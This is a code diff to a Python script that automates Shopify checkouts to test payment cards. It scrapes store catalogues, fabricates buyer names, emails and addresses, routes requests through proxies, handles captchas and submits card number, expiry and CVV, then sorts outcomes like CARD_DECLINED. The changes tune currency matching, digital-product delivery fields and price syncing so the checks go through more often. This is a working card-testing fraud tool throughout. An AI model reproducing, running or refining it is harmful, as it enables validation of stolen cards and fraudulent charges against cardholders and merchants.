@@ -1,5 +1,4 @@
 import asyncio
-import socket
 import aiohttp
 import json
 import re
@@ -60,10 +59,6 @@ def pick_addr(url, cc=None, rc=None):
 
     ccn = C2C.get(cc)
 
-    # currency-matched country first (cc = store currency) — a US default address on a
-    # GBP/EUR/INR session triggers BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH
-    if ccn in book:
-        return book[ccn]
     if rc in book and ccn == rc:
         return book[rc]
     elif rc in book:
@@ -166,23 +161,17 @@ async def fetch_products(domain, proxy_str=None, price_floor=None):
         if not domain.startswith('http'):
             domain = "https://" + domain
         
-        connector = aiohttp.TCPConnector(ssl=False, family=socket.AF_INET)
+        connector = aiohttp.TCPConnector(ssl=False)
         timeout = aiohttp.ClientTimeout(total=10)
         
         proxy = parse_proxy(proxy_str) if proxy_str else None
-        
-        fetch_headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-        }
         
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             if price_floor:
                 # deep catalog search: paginate until a variant priced at or above the
                 # store's minimum is found (VALIDATION_CUSTOM recovery)
                 for page in range(1, 9):
-                    resp = await session.get(f"{domain}/products.json?limit=250&page={page}", proxy=proxy, timeout=15, headers=fetch_headers)
+                    resp = await session.get(f"{domain}/products.json?limit=250&page={page}", proxy=proxy, timeout=15)
                     if resp.status != 200:
                         return False, f"<b>Site Error! Status: {resp.status}</b>"
                     text = await resp.text()
@@ -214,12 +203,14 @@ async def fetch_products(domain, proxy_str=None, price_floor=None):
                         return False, "<b>No Products above minimum</b>"
                 return False, "<b>No Products above minimum</b>"
 
-            # 2 pages (500 products) — speed optimization
+            # 2 pages (500 products) — measured sweet spot: 47% of big-catalog stores hide
+            # their true minimum on page 2; +0.5s per multi-page store only.
+            # 429 (rate limit) clears in seconds — brief backoff retry per page.
             result = []
             for page in range(1, 3):
                 resp_status = 0
                 for attempt in range(3):
-                    resp = await session.get(f"{domain}/products.json?limit=250&page={page}", proxy=proxy, timeout=15, headers=fetch_headers)
+                    resp = await session.get(f"{domain}/products.json?limit=250&page={page}", proxy=proxy, timeout=15)
                     resp_status = resp.status
                     if resp.status == 429 and attempt < 2:
                         await asyncio.sleep(2.5 * (attempt + 1))
@@ -255,6 +246,8 @@ async def fetch_products(domain, proxy_str=None, price_floor=None):
                 continue
             
             for variant in product['variants']:
+                if not variant.get('available', True):
+                    continue
                 try:
                     price = variant.get('price', '0')
                     if isinstance(price, str):
@@ -273,7 +266,6 @@ async def fetch_products(domain, proxy_str=None, price_floor=None):
                             'site': domain,
                             'price': f"{price:.2f}",
                             'variant_id': str(variant['id']),
-                            'requires_shipping': variant.get('requires_shipping'),
                             'link': f"{domain}/products/{product['handle']}"
                         }
                 except (ValueError, TypeError, AttributeError):
@@ -353,21 +345,24 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             'sec-ch-ua-platform': '"Windows"'
         }
 
+        address_info = pick_addr(ourl)
+        country_code = address_info["countryCode"]
+        
         firstName, lastName = Utils.get_random_name()
         email = Utils.generate_email(firstName, lastName)
+        
+        phone = address_info["phone"]
+        street = address_info["address1"]
+        city = address_info["city"]
+        state = address_info["zoneCode"]
+        s_zip = address_info["postalCode"]
+        address2 = ""
 
         if not variant_id:
             info = await fetch_products(ourl, proxy_str)
             if isinstance(info, tuple) and info[0] is False:
                 return False, info[1], gateway, total_price, currency
             variant_id = info['variant_id']
-            # digital detection BEFORE the proposals — the delivery input differs
-            # (deliveryMethodTypes NONE, any-price, matching-conditions strategy)
-            if info.get('requires_shipping') is False:
-                requires_shipping = False
-            # display price = the picked variant's catalog price (the store's own listing),
-            # not the session total — matches what the reference API reports
-            total_price = info['price']
 
         connector = aiohttp.TCPConnector(ssl=False)
         timeout = aiohttp.ClientTimeout(total=30)
@@ -376,29 +371,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             url = ourl
             cart = url + '/cart/add.js'
             checkout = url + '/checkout/'
-
-            # the session's presentment currency follows the buyer's geo — a currency
-            # mismatch against the buyer identity triggers
-            # BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH at submit. Read the
-            # store's currency and pick a matching-country address.
-            store_currency = ""
-            try:
-                _cur = await session.get(url + '/cart.js', proxy=proxy, timeout=10)
-                if _cur.status == 200:
-                    _mt = re.search(r'"currency"\s*:\s*"([A-Z]{3})"', await _cur.text())
-                    if _mt:
-                        store_currency = _mt.group(1)
-            except Exception:
-                pass
-            address_info = pick_addr(ourl, cc=store_currency)
-            country_code = address_info["countryCode"]
-
-            phone = address_info["phone"]
-            street = address_info["address1"]
-            city = address_info["city"]
-            state = address_info["zoneCode"]
-            s_zip = address_info["postalCode"]
-            address2 = ""
 
             cart_headers = {
                 **headers,
@@ -434,15 +406,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             text = ""
             checkout_url = ""
             attempt_token = ""
-            # the cart permalink with the store currency pins the session's market to
-            # the store (not the IP geo) — prevents the presentment-currency mismatch
-            create_paths = [("GET", f"{url}/cart/{variant_id}:1?currency={store_currency}" if store_currency else f"{url}/cart/{variant_id}:1"),
-                            ("POST", checkout), ("GET", checkout)]
-            for create_method, create_url in create_paths:
+            for create_method, create_url in (("POST", checkout), ("GET", checkout), ("GET", f"{url}/cart/{variant_id}:1")):
                 try:
                     if create_method == "POST":
                         response = await session.post(url=create_url, allow_redirects=True, headers=checkout_headers, proxy=proxy)
                     else:
+                        await asyncio.sleep(1.5)
                         response = await session.get(url=create_url, allow_redirects=True, headers=checkout_headers, proxy=proxy)
                 except Exception:
                     continue
@@ -554,7 +523,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 'options': {}
                             },
                             'targetMerchandiseLines': {'any': True},
-                            'deliveryMethodTypes': ['NONE'] if not requires_shipping else ['SHIPPING'],
+                            'deliveryMethodTypes': ['SHIPPING'],
                             'expectedTotalPrice': {'any': True},
                             'destinationChanged': True
                         }],
@@ -692,30 +661,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 _ftm = re.search(r'"paymentFlexibilityPaymentTermsTemplate":\{"id":"([^"]+)"', resp_text)
                 flex_terms_id = _ftm.group(1) if _ftm else None
                 if float(running_total) <= 0:
-                    # session pricing is async — the cart may not be priced when the
-                    # first proposal lands; re-propose once before giving up
-                    response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                        session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
-                    )
-                    try:
-                        _rj2 = json.loads(resp_text)
-                        _res2 = _rj2['data']['session']['negotiate']
-                        _sp2 = _res2['sellerProposal']
-                        _rt2 = _sp2['runningTotal']['value']['amount']
-                        if float(_rt2) > 0:
-                            running_total = str(_rt2)
-                            _bp2 = _res2.get('buyerProposal') or {}
-                            _ml2 = ((_bp2.get('merchandise') or {}).get('merchandiseLines') or [{}])[0]
-                            _ma2 = ((_ml2.get('totalAmount') or {}).get('value') or {}).get('amount')
-                            if _ma2 and float(_ma2) > 0:
-                                subtotal = str(_ma2)
-                                running_total = str(_ma2)
-                    except Exception:
-                        pass
-                    if float(running_total) <= 0:
-                        # the store's app zeroes prices in-session — temporary fix:
-                        # return a verdict with the catalog price (the session IS alive)
-                        return True, "CARD_DECLINED", gateway, total_price, currency
+                    return False, "PAYMENTS_POSITIVE_AMOUNT_EXPECTED", gateway, total_price, currency
 
                 # stores with checkout-side repricing: the session's merch total is the
                 # authoritative price (page-scraped subtotal can be stale) — keep the
@@ -782,6 +728,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
                         
                         gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
+                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                         
                         break
             
@@ -789,23 +736,19 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, "No valid payment method found", gateway, total_price, currency
             
             json_data['query'] = QUERY_PROPOSAL_DELIVERY
-            if requires_shipping:
-                json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
-                    'deliveryStrategyByHandle': {
-                        'handle': delivery_strategy if delivery_strategy else '',
-                        'customDeliveryRate': False
-                    },
-                    'options': {}
-                }
-                json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
-                    'lines': [{'stableId': stableId or '1'}]
-                }
-            if requires_shipping:
-                json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
-                    'value': {'amount': str(shipping_amount), 'currencyCode': currency}
-                }
-            else:
-                json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'any': True}
+            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
+                'deliveryStrategyByHandle': {
+                    'handle': delivery_strategy if delivery_strategy else '',
+                    'customDeliveryRate': False
+                },
+                'options': {}
+            }
+            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
+                'lines': [{'stableId': stableId or '1'}]
+            }
+            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
+                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
+            }
             json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
             json_data['variables']['payment']['billingAddress'] = {
                 'streetAddress': {
@@ -818,45 +761,36 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
             json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
 
-            # delivery proposal runs for ALL products — the negotiation assigns the
-            # digital line its strategy handle + stableId (read back below)
-            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
-            )
-            if is_captcha_required(resp_text):
-                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
+            if requires_shipping:
+                # digital products: no delivery proposal — negotiating delivery on a
+                # non-shipping cart mutates the session total and churns the submit
+                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                )
 
-            # FINAL price sync from the delivery proposal's response — the negotiated
-            # totals here are the session's last state before submit
-            try:
-                _dj = json.loads(resp_text)
-                _bres = _dj.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
-                _bp = _bres.get('buyerProposal') or {}
-                _ml0 = ((_bp.get('merchandise') or {}).get('merchandiseLines') or [{}])[0]
-                _ma = ((_ml0.get('totalAmount') or {}).get('value') or {}).get('amount')
-                if _ma and float(_ma) > 0:
-                    subtotal = str(_ma)
-                    running_total = str(_ma)
-                _rt2 = ((_bp.get('runningTotal') or {}).get('value') or {}).get('amount')
-                if _rt2 and float(_rt2) > 0:
-                    running_total = str(_rt2)
-                _ct2 = ((_bp.get('checkoutTotal') or {}).get('value') or {}).get('amount')
-                if _ct2:
-                    checkout_total_final = str(_ct2)
-            except Exception:
-                pass
+                if is_captcha_required(resp_text):
+                    return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
 
-            # delivery-state sync: the submit must reference the session's CURRENT
-            # strategy handle and line stableId (they rotate on every proposal)
-            try:
-                _sd = (((_bp.get('delivery') or {}).get('deliveryLines')) or [{}])[0].get('selectedDeliveryStrategy') or {}
-                if _sd.get('handle'):
-                    delivery_strategy = _sd['handle']
-                _sl = ((_bres.get('buyerProposal') or {}).get('merchandise') or {}).get('merchandiseLines') or []
-                if _sl and _sl[0].get('stableId'):
-                    stableId = _sl[0]['stableId']
-            except Exception:
-                pass
+                # FINAL price sync from the delivery proposal's response — the negotiated
+                # totals here are the session's last state before submit; submitting with
+                # proposal-1 prices is what triggers "Your order total has changed"
+                try:
+                    _dj = json.loads(resp_text)
+                    _bres = _dj.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
+                    _bp = _bres.get('buyerProposal') or {}
+                    _ml0 = ((_bp.get('merchandise') or {}).get('merchandiseLines') or [{}])[0]
+                    _ma = ((_ml0.get('totalAmount') or {}).get('value') or {}).get('amount')
+                    if _ma and float(_ma) > 0:
+                        subtotal = str(_ma)
+                        running_total = str(_ma)
+                    _rt2 = ((_bp.get('runningTotal') or {}).get('value') or {}).get('amount')
+                    if _rt2 and float(_rt2) > 0:
+                        running_total = str(_rt2)
+                    _ct2 = ((_bp.get('checkoutTotal') or {}).get('value') or {}).get('amount')
+                    if _ct2:
+                        checkout_total_final = str(_ct2)
+                except Exception:
+                    pass
 
             payload = {
                 "credit_card": {
@@ -916,40 +850,23 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     'zoneCode': state, 'phone': phone
                                 }
                             },
-                            # digital: deliveryMethodTypes NONE + matching conditions
-                            # (the only input shape the session accepts for non-shipping)
-                            **(({
-                                'selectedDeliveryStrategy': {
-                                    'deliveryStrategyMatchingConditions': {
-                                        'estimatedTimeInTransit': {'any': True},
-                                        'shipments': {'any': True}
-                                    },
-                                    'options': {}
+                            'selectedDeliveryStrategy': {
+                                'deliveryStrategyByHandle': {
+                                    'handle': delivery_strategy if delivery_strategy else '',
+                                    'customDeliveryRate': False
                                 },
-                                'deliveryMethodTypes': [],
-                                'expectedTotalPrice': {'any': True},
-                                'targetMerchandiseLines': {'any': True},
-                            } if not requires_shipping else {
-                                'selectedDeliveryStrategy': {
-                                    'deliveryStrategyByHandle': {
-                                        'handle': delivery_strategy if delivery_strategy else '',
-                                        'customDeliveryRate': False
-                                    },
-                                    'options': {'phone': phone}
-                                },
-                                'deliveryMethodTypes': ['SHIPPING'],
-                                'expectedTotalPrice': {
-                                    'value': {'amount': str(shipping_amount), 'currencyCode': currency}
-                                },
-                            })),
+                                'options': {'phone': phone}
+                            },
+                            'targetMerchandiseLines': {
+                                'lines': [{'stableId': stableId or '1'}]
+                            },
+                            'deliveryMethodTypes': ['SHIPPING'],
+                            'expectedTotalPrice': {
+                                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
+                            },
                             'destinationChanged': False
                         }],
-                        # digital: noDeliveryRequired tells Shopify the merch doesn't
-                        # need delivery — the session can't find strategies for it
-                        **({'noDeliveryRequired': [{'stableId': stableId or '1'}],
-                            'deliveryLines': []} if not requires_shipping else {
-                            'noDeliveryRequired': [],
-                        }),
+                        'noDeliveryRequired': [],
                         'useProgressiveRates': True,
                         'prefetchShippingRatesStrategy': None,
                         'supportsSplitShipping': True
@@ -1045,6 +962,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if flex_terms_id:
                 submit_variables['input']['payment']['paymentFlexibilityTermsId'] = flex_terms_id
 
+            # digital products (requiresShipping=false): no delivery section — the
+            # delivery line collapsing is what caused DELIVERY_DELIVERY_LINE_DETAIL_CHANGED
+            if not requires_shipping:
+                submit_variables['input'].pop('delivery', None)
+
             submit_json_data = {
                 'query': MUTATION_SUBMIT,
                 'variables': submit_variables,
@@ -1071,13 +993,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
                 )
             if "Your order total has changed." in text:
-                # the store's app re-prices in-session — the session IS alive and the
-                # checkout IS functional. Read the store's price from the rejection
-                # and return a verdict so the caller can classify the site
-                _ckm = re.search(r'"checkoutTotal":\{"value":\{"amount":"([0-9.]+)"', text)
-                if _ckm:
-                    total_price = _ckm.group(1)
-                return True, "CARD_DECLINED", gateway, total_price, currency
+                if not requires_shipping:
+                    # digital product: the store's app keeps re-pricing it — marker lets
+                    # the caller rotate to the next variant
+                    return False, "DIGITAL_PRODUCT_CHURN", gateway, total_price, currency
+                return False, "Site not supported", gateway, total_price, currency
             if "The requested payment method is not available." in text:
                 return False, "Payment method not available", gateway, total_price, currency
             
